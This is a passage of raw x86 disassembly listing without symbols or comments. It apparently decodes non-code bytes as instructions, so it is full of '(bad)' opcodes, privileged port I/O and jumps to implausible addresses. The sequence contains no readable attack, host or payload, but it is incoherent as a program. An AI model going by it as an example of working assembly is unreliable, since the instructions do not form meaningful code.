  410d18:	xor    al,0xbf
  410d1a:	fld    DWORD PTR [esi]
  410d1c:	fldenv [edx+0x3cfd2f9b]
  410d22:	arpl   WORD PTR [ebx],bx
  410d24:	or     esi,0x9ad2bf59
  410d2a:	daa    
  410d2b:	daa    
  410d2c:	pop    ecx
  410d2d:	jnp    0x410dab
  410d2f:	adc    cl,BYTE PTR [ebp+0x4e]
  410d32:	pop    esi
  410d33:	ficomp DWORD PTR [eax]
  410d35:	shl    ebx,1
  410d37:	and    DWORD PTR [ebx+0x17fb05af],esp
  410d3d:	or     BYTE PTR [ecx+0xf],cl
  410d40:	loope  0x410cd5
  410d42:	or     dl,0xd4
  410d45:	jg     0x410d2e
  410d47:	inc    ebx
  410d48:	arpl   WORD PTR [edx+0x5596df58],dx
  410d4e:	cmp    BYTE PTR [eax+esi*4+0x62b4da45],dl
  410d55:	push   ecx
  410d56:	mov    edx,0xba953066
  410d5b:	data16 and bl,ch
  410d5e:	push   ss
  410d5f:	test   DWORD PTR [eax+0x4f],0xa939f360
  410d66:	adc    BYTE PTR [ebx],al
  410d68:	adc    al,0x79
  410d6a:	cwde   
  410d6b:	push   edx
  410d6c:	dec    ebx
  410d6d:	iret   
  410d6e:	sbb    BYTE PTR [edx+0x4a8047a0],0x14
  410d75:	mov    BYTE PTR [ecx-0x39],bh
  410d78:	cmp    eax,0x22367188
  410d7d:	outs   dx,BYTE PTR ds:[esi]
  410d7e:	cmp    eax,DWORD PTR [ecx-0x39]
  410d81:	push   ecx
  410d82:	leave  
  410d83:	cmc    
  410d84:	dec    ecx
  410d85:	lods   eax,DWORD PTR ds:[esi]
  410d86:	in     al,0xf8
  410d88:	dec    edi
  410d89:	add    al,0xa3
  410d8b:	mov    bl,BYTE PTR [ecx-0x6f215d79]
  410d91:	retf   0xe03f
  410d94:	rol    BYTE PTR [ebx-0x37],1
  410d97:	and    BYTE PTR [ecx],0x54
  410d9a:	inc    ebp
  410d9b:	adc    BYTE PTR [eax+0x2b90a105],ch
  410da1:	or     bh,BYTE PTR [esi-0x46]
  410da4:	stos   BYTE PTR es:[edi],al
  410da5:	fiadd  WORD PTR [ebp-0x8bd9bc7]
  410dab:	loopne 0x410d74
  410dad:	pop    esi
  410dae:	rol    DWORD PTR [eax+0x1112670d],0x76
  410db5:	mov    al,ds:0xb289cb93
  410dba:	dec    edi
  410dbb:	xchg   esp,eax
  410dbc:	sub    al,0x94
  410dbe:	inc    edx
  410dbf:	fwait
  410dc0:	fwait
  410dc1:	div    BYTE PTR [eax+0x2f9d4c81]
  410dc7:	push   ebp
  410dc8:	adc    ecx,DWORD PTR [esi+edi*8+0x374b16c1]
  410dcf:	and    dh,dh
  410dd1:	jno    0x410e22
  410dd3:	jmp    0x410df4
  410dd5:	lods   eax,DWORD PTR ds:[esi]
  410dd6:	adc    al,BYTE PTR [esi+0x35]
  410dd9:	(bad)
  410ddc:	ds pause 
  410ddf:	in     eax,dx
  410de0:	call   0xae7d7250
  410de5:	add    DWORD PTR ds:[eax],esi
  410de8:	scas   eax,DWORD PTR es:[edi]
  410de9:	and    DWORD PTR [edx+0x4d],ebx
  410dec:	les    eax,FWORD PTR ds:0x23109927
  410df2:	mov    dl,0xb5
  410df4:	push   cs
  410df5:	leave  
  410df6:	rcr    BYTE PTR [ebp-0x28dd950c],1
  410dfc:	xchg   edx,eax
  410dfd:	xor    al,0xb8
  410dff:	daa    
  410e00:	out    0x47,al
  410e02:	and    DWORD PTR ds:0xc1d6f522,0xb60557f2
  410e0c:	dec    eax
  410e0d:	fidiv  WORD PTR cs:[eax-0x58a1eea0]
  410e14:	cmp    BYTE PTR [eax],ch
  410e16:	mov    DWORD PTR [ecx],ebx
  410e18:	xchg   ebp,eax
  410e19:	pusha  
  410e1a:	jae    0x410dc9
  410e1c:	jns    0x410e8e
  410e1e:	out    0xbd,eax
  410e20:	cwde   
  410e21:	xor    al,0xe2
  410e23:	jne    0x410ea4
  410e25:	xor    eax,0x66116dbe
  410e2a:	mov    eax,ds:0xc5ae876c
  410e2f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e31:	mov    dh,0x95
  410e33:	cmp    dh,BYTE PTR [ebx]
  410e35:	pusha  
  410e36:	adc    dh,BYTE PTR [eax+ecx*2-0x1b7a1db8]
  410e3d:	cld    
  410e3e:	inc    esp
  410e3f:	xor    esp,eax
  410e41:	dec    ecx
  410e42:	fs sbb eax,0x65475c0b
  410e48:	test   eax,0xdaa97599
  410e4d:	ja     0x410e2a
  410e4f:	mov    bl,0xd8
  410e51:	cmp    DWORD PTR [ecx-0x50],0x56
  410e55:	daa    
  410e56:	dec    ebx
  410e57:	imul   edi,DWORD PTR [ebp-0x29149a04],0x45
  410e5e:	retf   0x9c1f
  410e61:	xchg   edi,eax
  410e62:	lds    ebx,FWORD PTR [edx+0x34]
  410e65:	push   ebp
  410e66:	test   ebp,0xf70e65da
  410e6c:	mov    ds:0x99f78e89,al
  410e71:	ja     0x410ed5
  410e73:	dec    ebp
  410e74:	ja     0x410e7a
  410e76:	call   0x224b:0x83c7a6c4
  410e7d:	add    BYTE PTR [ebp+0x6b],dl
  410e80:	retf   
  410e81:	cld    
  410e82:	xor    DWORD PTR [ebx-0x3e],edx
  410e85:	aam    0xa5
  410e87:	mov    eax,ds:0x9b2487be
  410e8c:	sub    eax,0x53ddc72b
  410e91:	ror    ecx,cl
  410e93:	add    eax,0xccd44648
  410e98:	(bad)
  410e9c:	shl    DWORD PTR ds:0x1d0a6d5f,1
  410ea2:	pop    ecx
  410ea3:	inc    esi
  410ea4:	and    al,0x38
  410ea6:	sti    
  410ea7:	stos   BYTE PTR es:[edi],al
  410ea8:	mov    ebx,0xe50fcab9
  410ead:	out    0x8d,al
  410eaf:	add    eax,0xb696b0a1
  410eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eb5:	jl     0x410f1a
  410eb7:	or     bh,al
  410eb9:	jl     0x410f36
  410ebb:	int3   
  410ebc:	out    dx,eax
  410ebd:	mov    bl,0xc7
  410ebf:	xchg   esi,eax
  410ec0:	ret    
  410ec1:	lds    edi,FWORD PTR [ebp-0xed7538]
  410ec7:	mov    eax,ds:0xf34af5b5
  410ecc:	popa   
  410ecd:	mov    bl,0xc8
  410ecf:	mov    edi,0xf975ba0b
  410ed4:	mov    ebp,0x718ca2ba
  410ed9:	ficomp WORD PTR [eax+eiz*2]
  410edc:	retf   0xc781
  410edf:	ret    0xee91
  410ee2:	test   DWORD PTR [ecx+0x101d7542],esp
  410ee8:	cmp    BYTE PTR [edx+0x647aa7e1],cl
  410eee:	data16 add ah,bh
  410ef1:	lea    edi,[eax]
  410ef3:	outs   dx,BYTE PTR ds:[esi]
  410ef4:	jne    0x410f58
  410ef6:	mov    DWORD PTR [ebx-0x17],edi
  410ef9:	dec    edi
  410efa:	xchg   ecx,eax
  410efb:	dec    esp
  410efc:	je     0x410ecb
  410efe:	std    
  410eff:	cld    
  410f00:	imul   ebx,ecx,0x5bd9f292
  410f06:	dec    ecx
  410f07:	les    ecx,FWORD PTR [ecx-0x7d1f0f8]
  410f0d:	or     dh,BYTE PTR [ebx-0x5dde42ea]
  410f13:	out    0xa4,eax
  410f15:	mov    ah,0xc2
  410f17:	in     al,0x0
  410f19:	(bad)  
  410f1a:	into   
  410f1b:	mov    dl,0xd6
  410f1d:	pop    ebx
  410f1e:	neg    esi
  410f20:	into   
  410f21:	xchg   ebx,eax
  410f22:	mov    WORD PTR [edi],es
  410f24:	int3   
  410f25:	xor    ebx,ebx
  410f27:	and    BYTE PTR [ebx+0x4b],cl
  410f2a:	adc    al,0x6d
  410f2c:	dec    esp
  410f2d:	push   ebp
  410f2e:	dec    eax
  410f2f:	test   DWORD PTR [edx+0x6e69584],esi
  410f35:	xor    BYTE PTR [bx+si-0x2f7b],ch
  410f3a:	mov    BYTE PTR [eax],ch
  410f3c:	xlat   BYTE PTR ds:[ebx]
  410f3d:	mov    ebp,DWORD PTR fs:[ecx+esi*4]
  410f41:	loopne 0x410f1c
  410f43:	cmp    al,0x7
  410f45:	ret    0x310b
  410f48:	scas   al,BYTE PTR es:[edi]
  410f49:	inc    esp
  410f4a:	xchg   ah,bh
  410f4c:	add    BYTE PTR [esi],bh
  410f4e:	test   eax,0x620ca3e3
  410f53:	jl     0x410f3f
  410f55:	mov    ah,0x17
  410f57:	xchg   DWORD PTR [ebp-0x65],esi
  410f5a:	repnz and DWORD PTR [ebp-0x4a],ebx
  410f5e:	dec    ecx
  410f5f:	int    0x2d
  410f61:	sahf   
  410f62:	lea    ebp,[ebx+0x39]
  410f65:	or     esi,esp
  410f67:	shr    DWORD PTR [ebp+ebx*4-0x38f1779b],1
  410f6e:	add    al,0xf2
  410f70:	icebp  
  410f71:	inc    edx
  410f72:	ss adc eax,0x6131247d
  410f78:	rol    BYTE PTR [esi-0x71cd739a],1
  410f7e:	in     al,dx
  410f7f:	ret    
  410f80:	aam    0x84
  410f82:	mov    al,0xa7
  410f84:	mov    bl,0xe4
  410f86:	push   ebx
  410f87:	shl    eax,1
  410f89:	ds stc 
  410f8b:	fnsave [edx+0x14]
  410f8e:	sub    al,0x33
  410f90:	lock in al,dx
  410f92:	fild   WORD PTR [eax+0x6ca3fe83]
  410f98:	mov    edi,0xc75e7d60
  410f9d:	or     esi,DWORD PTR [edx-0x2099d831]
  410fa3:	pop    ds
  410fa4:	jp     0x410f6d
  410fa6:	imul   edx,DWORD PTR [ebx],0x9
  410fa9:	jo     0x410f54
  410fab:	mov    eax,ds:0x66a2372d
  410fb0:	jmp    0x410fd3
  410fb2:	loope  0x410f78
  410fb4:	cld    
  410fb5:	cwde   
  410fb6:	pusha  
  410fb7:	test   eax,0x1e3d7bea
  410fbc:	int    0x88
  410fbe:	and    BYTE PTR [esp+edx*1+0x1f9a0c74],dl
  410fc5:	jne    0x410f98
  410fc7:	sti    
  410fc8:	loop   0x410f5c
  410fca:	cwde   
  410fcb:	in     eax,0xf9
  410fcd:	xor    eax,0x7231d6c7
  410fd2:	sub    al,0xbe
  410fd4:	mov    bh,BYTE PTR ds:0x9774c97a
  410fda:	push   ebx
  410fdb:	mov    dh,0xa3
  410fdd:	jno    0x411014
  410fdf:	sbb    BYTE PTR [ebx-0x3a0b66f9],0x84
  410fe6:	or     BYTE PTR [edx],bh
  410fe8:	leave  
  410fe9:	(bad)  [esi+0x485233f7]
  410fef:	cdq    
  410ff0:	(bad)  [esi+0x36]
  410ff3:	cs jmp 0x410f7f
  410ff6:	ins    DWORD PTR es:[edi],dx
  410ff7:	loopne 0x410f7e
  410ff9:	cmp    eax,0xfe2a0f7
  410ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fff:	push   edi
  411000:	push   edi
  411001:	pop    esp
  411002:	pop    esi
  411003:	enter  0xfced,0xe7
  411007:	jno    0x411083
  411009:	fistp  WORD PTR [esi+esi*8+0x49]
  41100d:	push   ecx
  41100e:	or     edi,DWORD PTR [ecx+0x747558e3]
  411014:	out    dx,eax
  411015:	sbb    edi,DWORD PTR [eax]
  411017:	aas    
  411018:	and    edx,edi
  41101a:	shld   DWORD PTR [esi-0x29],ebp,0x53
  41101f:	mov    ecx,0x22cabf79
  411024:	test   eax,0x1f7a1e86
  411029:	xchg   ecx,eax
  41102a:	nop
  41102b:	mov    eax,ds:0x6258bcb
  411030:	xchg   esi,eax
  411031:	dec    ecx
  411032:	je     0x41107d
  411034:	pop    ecx
  411035:	add    DWORD PTR [ebx],esp
  411037:	into   
  411038:	les    ecx,FWORD PTR [esp+edx*1-0xb8b6bc4]
  41103f:	scas   eax,DWORD PTR es:[edi]
  411040:	enter  0xb942,0x4b
  411044:	jmp    0xb4c80098
  411049:	xchg   esi,eax
  41104a:	xchg   esi,eax
  41104b:	mov    bh,0x17
  41104d:	sbb    eax,0x69457ebb
  411052:	int3   
  411053:	add    BYTE PTR [esi+0x3fbecd0d],cl
  411059:	mov    al,0x11
  41105b:	repnz outs dx,DWORD PTR es:[esi]
  41105e:	sub    DWORD PTR [ecx-0x3120fb66],edx
  411064:	adc    DWORD PTR cs:[eax-0x61cca6d9],ebx
  41106b:	mov    esi,0xeeb21551
  411070:	mov    esp,eax
  411072:	dec    ebp
  411073:	mov    bh,0x44
  411075:	out    0xff,eax
  411077:	in     eax,dx
  411078:	mov    ch,BYTE PTR [ecx-0x2b]
  41107b:	pop    ebp
  41107c:	hlt    
  41107d:	mov    bl,0xac
  41107f:	fstp   TBYTE PTR [eax]
  411081:	mov    ds:0xcccbdb0c,al
  411086:	rol    DWORD PTR [ecx],cl
  411088:	pop    es
  411089:	mov    edi,0xabb7ecd
  41108e:	lahf   
  41108f:	je     0x4110c7
  411091:	push   cs
  411092:	sbb    dl,ah
  411094:	icebp  
  411095:	add    BYTE PTR [esi-0x3e702c4a],bl
  41109b:	addr16 adc eax,0xb3b8a104
  4110a1:	mov    edi,0x872b43fb
  4110a6:	inc    ecx
  4110a7:	sub    al,0x1b
  4110a9:	push   0xdd816dda
  4110ae:	mov    DWORD PTR [edx+edi*1-0x46],eax
  4110b2:	(bad)  
  4110b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b5:	out    dx,al
  4110b6:	cld    
  4110b7:	jmp    0x4110b9
  4110b9:	int    0xd5
  4110bb:	adc    ebp,DWORD PTR [esp]
  4110be:	pop    ecx
  4110bf:	sub    ch,BYTE PTR [esi-0x593a719e]
  4110c5:	sbb    al,0xff
  4110c7:	jae    0x41110c
  4110c9:	push   0x8
  4110cb:	or     eax,edi
  4110cd:	hlt    
  4110ce:	cmp    cl,dl
  4110d0:	and    bh,cl
  4110d2:	sbb    eax,DWORD PTR [ecx]
  4110d4:	test   cl,dh
  4110d6:	and    ebp,eax
  4110d8:	adc    BYTE PTR [ebx],cl
  4110da:	or     dl,BYTE PTR [edx]
  4110dc:	push   esi
  4110dd:	mov    eax,0x2fb64328
  4110e2:	outs   dx,DWORD PTR ds:[esi]
  4110e3:	cmp    al,0x6d
  4110e5:	rol    BYTE PTR [esi+0x3ec2b1e4],1
  4110eb:	sbb    eax,0x149e4d0
  4110f0:	push   ebp
  4110f1:	inc    edi
  4110f2:	jp     0x4110de
  4110f4:	push   cs
  4110f5:	xchg   esi,eax
  4110f6:	pop    esi
  4110f7:	out    0xea,eax
  4110f9:	or     bl,BYTE PTR [ecx+ebp*2-0x39]
  4110fd:	(bad)  
  4110fe:	bound  eax,QWORD PTR [edi]
  411100:	pushf  
  411101:	das    
  411102:	sub    al,0xbb
  411104:	mov    WORD PTR [ecx-0x4f],ds
  411107:	or     ah,BYTE PTR [esi+0x2f387cb6]
  41110d:	jmp    0x93d1fbce
  411112:	std    
  411113:	rcl    DWORD PTR [edx+eax*2-0x25],1
  411117:	mov    BYTE PTR [ebp+0x4c9b539],ch
  41111d:	int3   
  41111e:	fst    QWORD PTR [edx+ecx*8+0x21]
  411122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411123:	rcl    DWORD PTR [edi+0x6bbf62c7],0xed
  41112a:	mov    dl,BYTE PTR [eax]
  41112c:	out    0x6d,al
  41112e:	daa    
  41112f:	repz dec ecx
  411131:	pop    edi
  411132:	sbb    DWORD PTR [edx],edx
  411134:	cli    
  411135:	adc    bh,BYTE PTR [ecx+0x7c]
  411138:	scas   al,BYTE PTR es:[edi]
  411139:	adc    ecx,DWORD PTR [ebp-0x68]
  41113c:	popf   
  41113d:	jne    0x41117f
  41113f:	mov    edx,0xfbf1d307
  411144:	lahf   
  411145:	pop    ecx
  411146:	sahf   
  411147:	ror    BYTE PTR [eax+0x662c0919],0x12
  41114e:	cmp    al,0x3a
  411150:	les    ecx,FWORD PTR [edi+0xb2cb547]
  411156:	(bad)  
  411157:	mov    gs,WORD PTR [eax]
  411159:	xchg   edx,eax
  41115a:	popa   
  41115b:	in     eax,dx
  41115c:	out    0xe6,eax
  41115e:	sti    
  41115f:	add    eax,0x3dfb9fb3
  411164:	adc    BYTE PTR [ebx],0xa
  411167:	jmp    0x411191
  411169:	pop    edi
  41116a:	push   ds
  41116b:	stc    
  41116c:	sub    ecx,esi
  41116e:	(bad)  
  41116f:	jmp    0x4110f9
  411171:	and    eax,0x92a3e3c9
  411176:	push   edi
  411177:	jmp    0xf7f59fff
  41117c:	pop    edi
  41117d:	sar    ebx,0x25
  411180:	jge    0x41114b
  411182:	adc    BYTE PTR [ebx],ah
  411184:	adc    DWORD PTR [edx+0x3e],esi
  411187:	mov    ch,0x10
  411189:	popf   
  41118a:	dec    ebp
  41118b:	in     eax,dx
  41118c:	and    edi,DWORD PTR [ebx-0x307a6af5]
  411192:	pop    edx
  411193:	(bad)  
  411194:	mov    ds:0x89484b55,eax
  411199:	mov    dh,0x11
  41119b:	mov    bh,0x53
  41119d:	outs   dx,DWORD PTR ds:[esi]
  41119e:	repz push cs
  4111a0:	and    bh,bh
  4111a2:	je     0x4111ec
  4111a4:	jg     0x4111ab
  4111a6:	xor    bh,BYTE PTR [esi]
  4111a8:	pop    esp
  4111a9:	push   ecx
  4111aa:	push   ecx
  4111ab:	ds sahf 
  4111ad:	in     al,dx
  4111ae:	cld    
  4111af:	mov    ch,0x60
  4111b1:	and    eax,0x378e1b9e
  4111b6:	pop    eax
  4111b7:	dec    edx
  4111b8:	iret   
  4111b9:	adc    al,0x8d
  4111bb:	cli    
  4111bc:	imul   edx,DWORD PTR [ecx+0x17ddef6c],0xffffff8f
  4111c3:	add    esp,DWORD PTR [edi+0x71b8d5d2]
  4111c9:	sbb    edi,DWORD PTR [edx]
  4111cb:	arpl   WORD PTR [ecx+0x6cdbc2],bp
  4111d1:	pop    esp
  4111d2:	fdiv   DWORD PTR [edi+0x7a]
  4111d5:	xor    eax,0x144af519
  4111da:	adc    DWORD PTR [esi+0x7984a5cc],esi
  4111e0:	mov    esi,0x8e0fb6d5
  4111e5:	sbb    eax,0xccecadb6
  4111ea:	add    BYTE PTR [esp+ebp*2],cl
  4111ed:	mov    DWORD PTR [ecx-0x726bb4e6],0x7ef35ac1
  4111f7:	stos   BYTE PTR es:[edi],al
  4111f8:	xchg   ebp,eax
  4111f9:	seto   BYTE PTR ds:0xe11b4b6a
  411200:	out    dx,eax
  411201:	pusha  
  411202:	lock mov WORD PTR [ebx-0x1e5abf21],?
  411209:	arpl   WORD PTR es:[esi],sp
  41120c:	mov    dl,0x65
  41120e:	dec    ecx
  41120f:	add    esp,edx
  411211:	dec    eax
  411212:	ds sahf 
  411214:	lods   al,BYTE PTR ds:[esi]
  411215:	fs push ebx
  411217:	fisubr DWORD PTR [esi]
  411219:	sub    eax,0xe8d3d601
  41121e:	inc    esp
  41121f:	or     al,0x8b
  411221:	xchg   ecx,eax
  411222:	mov    esp,0x7e7b4308
  411227:	int    0x16
  411229:	add    DWORD PTR ds:0x6ebf63a3,ecx
  41122f:	ret    
  411230:	inc    edx
  411231:	adc    BYTE PTR [ebx+0x41],bl
  411234:	mov    edx,0x120e7cd9
  411239:	xchg   esp,eax
  41123a:	jae    0x4111f1
  41123c:	repz and ebp,DWORD PTR ds:0x77cf342d
  411243:	enter  0x37f0,0x4c
  411247:	in     eax,dx
  411248:	sbb    esp,DWORD PTR [esi+0x37647418]
  41124e:	call   0x734:0x970573b3
  411255:	pusha  
  411256:	ret    
  411257:	pop    es
  411258:	jae    0x4112cc
  41125a:	or     ecx,DWORD PTR [edi-0x63]
  41125d:	rol    BYTE PTR ds:0xf50d3fda,0x75
  411264:	call   0xf8d2ad8c
  411269:	dec    edx
  41126a:	inc    edx
  41126b:	mov    esp,0xc16cf636
  411270:	out    dx,eax
  411271:	or     DWORD PTR [edx-0x6a],edi
  411274:	bound  edx,QWORD PTR [ecx]
  411276:	sub    dh,BYTE PTR [ecx+0x2a700154]
  41127c:	test   eax,0xc9847938
  411281:	inc    edx
  411282:	sub    BYTE PTR ds:0xe9bf259a,dh
  411288:	xchg   BYTE PTR [esi],ah
  41128a:	dec    ebx
  41128b:	cmp    DWORD PTR [ecx+0x51514c94],esi
  411291:	stc    
  411292:	int    0x8a
  411294:	fsub   st(0),st
  411296:	shr    DWORD PTR [ecx+ebp*2],cl
  411299:	push   eax
  41129a:	mov    bl,0xb7
  41129c:	in     al,0x4
  41129e:	pusha  
  41129f:	lods   eax,DWORD PTR ds:[esi]
  4112a0:	das    
  4112a1:	fidivr WORD PTR [esi-0x12ad15a9]
  4112a7:	or     DWORD PTR [ecx+0x1a],ebp
  4112aa:	shr    BYTE PTR ds:0xb14ddfe9,1
  4112b0:	std    
  4112b1:	jb     0x411250
  4112b3:	mov    BYTE PTR [ebx],0x6e
  4112b6:	pop    ss
  4112b7:	xchg   ecx,eax
  4112b8:	xchg   ebp,eax
  4112b9:	cmovne esp,DWORD PTR [eax-0x4b]
  4112bd:	int    0x4c
  4112bf:	aaa    
  4112c0:	mov    bl,0x19
  4112c2:	push   eax
  4112c3:	pushf  
  4112c4:	lahf   
  4112c5:	inc    eax
  4112c6:	lock inc esi
  4112c8:	enter  0x7ee3,0x5b
  4112cc:	mov    esi,0xefda345a
  4112d1:	adc    edi,esp
  4112d3:	aam    0xda
  4112d5:	dec    dl
  4112d7:	(bad)  
  4112d8:	(bad)  
  4112d9:	jmp    0xa359625f
  4112de:	jg     0x411341
  4112e0:	clc    
  4112e1:	xchg   edi,eax
  4112e2:	fnstenv [ebp+eiz*1-0x1e49a745]
  4112e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112ea:	inc    ecx
  4112eb:	fisttp WORD PTR [ebx+ebx*4+0x1f2b82ec]
  4112f2:	xchg   esi,eax
  4112f3:	and    DWORD PTR [eax],0xf7ce07cf
  4112f9:	adc    BYTE PTR [ecx+esi*2],dh
  4112fc:	add    BYTE PTR [eax],al
  4112fe:	sbb    cl,BYTE PTR [esi]
  411300:	test   DWORD PTR [ecx],ebx
  411302:	(bad)  
  411303:	pop    ecx
  411304:	jnp    0x411288
  411306:	cmovne ebp,DWORD PTR [esi+0x29]
  41130a:	cdq    
  41130b:	(bad)
  41130e:	push   es
  41130f:	dec    ecx
  411310:	sahf   
  411311:	pusha  
  411312:	je     0x4112bd
  411314:	int3   
  411315:	sub    BYTE PTR [edx+0x49adf4b4],dl
  41131b:	sub    al,0xa1
  41131d:	mov    edx,0x4bfca5fe
  411322:	dec    edx
  411323:	or     esi,DWORD PTR ds:0xfab6a22a
  411329:	rcl    DWORD PTR [edi*1-0x3059517e],1
  411330:	cmp    BYTE PTR [ebx+0x2e],bh
  411333:	lds    ecx,FWORD PTR [eax+esi*1+0x67]
  411337:	xor    eax,0x685642f4
  41133c:	or     edx,esi
  41133e:	scas   al,BYTE PTR es:[edi]
  41133f:	inc    ecx
  411340:	out    dx,eax
  411341:	je     0x4112fb
  411343:	pop    ds
  411344:	rcl    DWORD PTR [edx],0x3a
  411347:	enter  0xe387,0x44
  41134b:	pop    esi
  41134c:	mov    eax,0xd4eef905
  411351:	push   es
  411352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411353:	add    al,0x75
  411355:	or     al,0xfd
  411357:	out    dx,eax
  411358:	pop    es
  411359:	jnp    0x411333
  41135b:	jbe    0x4113a5
  41135d:	pop    ecx
  41135e:	(bad)  [ecx-0x5d09c090]
  411364:	mov    WORD PTR [ebp-0x82b39a8],fs
  41136a:	test   eax,0xa6254788
  41136f:	pop    eax
  411370:	(bad)  
  411371:	jp     0x4113ba
  411373:	or     dh,BYTE PTR [ebx-0x1f1d9636]
  411379:	pop    edx
  41137a:	cmp    bl,ah
  41137c:	ror    BYTE PTR [esi],cl
  41137e:	shr    DWORD PTR [ebx-0x1a],cl
  411381:	dec    ecx
  411382:	pop    esp
  411383:	lods   al,BYTE PTR ds:[esi]
  411384:	out    0x21,al
  411386:	lahf   
  411387:	test   eax,0xd59f67ff
  41138c:	neg    cl
  41138e:	mov    eax,0x160eb1fb
  411393:	jge    0x411333
  411395:	hlt    
  411396:	add    DWORD PTR [edx-0x48f5a7ac],esi
  41139c:	cmp    al,BYTE PTR [eax-0x65b00704]
  4113a2:	push   ds
  4113a3:	sbb    BYTE PTR [edx-0x28b89f18],cl
  4113a9:	jnp    0x411363
  4113ab:	mov    eax,DWORD PTR [eax-0x10]
  4113ae:	mul    BYTE PTR [ecx+0x13]
  4113b1:	inc    ebx
  4113b2:	jmp    0x9386f0eb
  4113b7:	sahf   
  4113b8:	mov    edx,ebx
  4113ba:	inc    esi
  4113bb:	daa    
  4113bc:	pop    ebp
  4113bd:	ins    BYTE PTR es:[edi],dx
  4113be:	jno    0x4113cc
  4113c0:	pop    ds
  4113c1:	imul   eax,DWORD PTR [esi],0xffffff80
  4113c4:	mov    esi,0x74283894
  4113c9:	shl    BYTE PTR [edx-0x41c57780],1
  4113cf:	add    eax,0x20
  4113d2:	xchg   edx,eax
  4113d3:	and    ch,BYTE PTR [edx]
  4113d5:	inc    esp
  4113d6:	(bad)  
  4113d7:	or     eax,0xd9b387dd
  4113dc:	stc    
  4113dd:	inc    eax
  4113de:	repnz pushf 
  4113e0:	sahf   
  4113e1:	sub    ebp,ecx
  4113e3:	les    ebp,FWORD PTR [eax-0x51]
  4113e6:	adc    eax,0x915aab26
  4113eb:	mov    bl,0xd5
  4113ed:	retf   
  4113ee:	imul   esi,DWORD PTR [edx+0x5f],0xffffffdd
  4113f2:	mov    ds:0x62ca294a,eax
  4113f7:	test   BYTE PTR [esi+0x6d0e65bc],bh
  4113fd:	mov    WORD PTR [esi],?
  4113ff:	push   edx
  411400:	inc    ebp
  411401:	pop    ebp
  411402:	inc    eax
  411403:	mov    eax,ss:0xac9b5f13
  411409:	iret   
  41140a:	outs   dx,DWORD PTR ds:[esi]
  41140b:	dec    ebx
  41140c:	push   eax
  41140d:	adc    BYTE PTR [edi-0x4c5e6b6a],ah
  411413:	clc    
  411414:	ret    0xa587
  411417:	into   
  411418:	inc    edx
  411419:	(bad)  
  41141a:	daa    
  41141b:	cdq    
  41141c:	cmp    eax,0xd626484b
  411421:	cdq    
  411422:	push   ebp
  411423:	dec    ecx
  411424:	sub    bh,BYTE PTR [edx+ebx*1+0x74d8852c]
  41142b:	push   0x3c
  41142d:	in     eax,dx
  41142e:	mov    edi,0xbf77d94e
  411433:	pop    esp
  411434:	xchg   ebx,eax
  411435:	mov    ebx,0x96c3d6f2
  41143a:	repnz mov dl,0x43
  41143d:	ins    BYTE PTR es:[edi],dx
  41143e:	sahf   
  41143f:	cmp    DWORD PTR [edi-0x34],ecx
  411442:	mov    cl,0xd4
  411444:	jnp    0x411477
  411446:	(bad)  
  411447:	sub    esp,DWORD PTR [ecx+0x40]
  41144a:	scas   al,BYTE PTR es:[edi]
  41144b:	mov    esp,0xa2e2b1a
  411450:	or     dh,0x27
  411453:	mov    edx,ds
  411455:	xchg   ecx,eax
  411456:	(bad)  
  411457:	xchg   edx,eax
  411458:	test   al,0x6
  41145a:	mov    dl,0x25
  41145c:	mov    al,0x68
  41145e:	mov    ecx,DWORD PTR [esi]
  411460:	(bad)  
  411462:	shr    DWORD PTR [ebx-0x20],cl
  411465:	popa   
  411466:	cli    
  411467:	cmp    DWORD PTR [edx+0x1b0dc1a2],esi
  41146d:	add    cl,cl
  41146f:	mov    al,ds:0x51fe081
  411474:	cmc    
  411475:	lahf   
  411476:	mov    dl,0x85
  411478:	push   esi
  411479:	sbb    al,0x72
  41147b:	or     al,0xf9
  41147d:	mov    ecx,0x96a1a5f1
  411482:	mov    eax,0x5276db8f
  411487:	stc    
  411488:	lods   al,BYTE PTR ds:[esi]
  411489:	jecxz  0x411471
  41148b:	out    0x5f,al
  41148d:	cmp    ah,bh
  41148f:	jmp    0xc441:0xb115f1a6
  411496:	fcomp  DWORD PTR [ebx]
  411498:	cmp    al,BYTE PTR [edi]
  41149a:	retf   0x1507
  41149d:	xor    BYTE PTR [edx],0x93
  4114a0:	inc    edi
  4114a1:	arpl   dx,sp
  4114a3:	arpl   WORD PTR [eax],si
  4114a5:	rol    ecx,1
  4114a7:	sti    
  4114a8:	leave  
  4114a9:	xor    DWORD PTR [esi-0x685f5f9d],esp
  4114af:	jae    0x4114a2
  4114b1:	test   BYTE PTR [eax],0xd3
  4114b4:	ss add eax,0x30a8bbdd
  4114ba:	mov    eax,ds:0xc4a822c9
  4114bf:	adc    cl,bh
  4114c1:	dec    ecx
  4114c3:	and    ebp,esp
  4114c5:	pushf  
  4114c6:	push   0xfd9c2317
  4114cb:	fdiv   st,st(1)
  4114cd:	jmp    0x41151c
  4114cf:	loopne 0x411486
  4114d1:	mov    edi,0x75f8d273
  4114d6:	jmp    0x3773:0x5847d018
  4114dd:	ins    BYTE PTR es:[edi],dx
  4114de:	out    dx,eax
  4114df:	sbb    BYTE PTR [eax-0x6c696d20],bh
  4114e5:	in     al,0x41
  4114e7:	in     al,0x26
  4114e9:	jmp    0x41146e
  4114eb:	push   ecx
  4114ec:	sub    BYTE PTR ds:0x2d084db3,bl
  4114f2:	in     al,0xca
  4114f4:	inc    edx
  4114f5:	loopne 0x4114b0
  4114f7:	icebp  
  4114f8:	aam    0x16
  4114fa:	and    esi,DWORD PTR [edi-0x42]
  4114fd:	pop    edx
  4114fe:	pushf  
  4114ff:	int3   
  411500:	mov    ds:0xcebe92d8,eax
  411505:	dec    ecx
  411506:	pop    edi
  411507:	xor    eax,0xdd6e92fd
  41150c:	mov    ebx,ecx
  41150e:	fiadd  WORD PTR [edx+eax*1]
  411511:	dec    edi
  411512:	add    eax,0xae99e9cd
  411517:	imul   ebx,DWORD PTR [edx],0xc5487fdb
  41151d:	sahf   
  41151e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41151f:	or     ch,bh
  411521:	mov    eax,ds:0x4545d477
  411526:	ret    
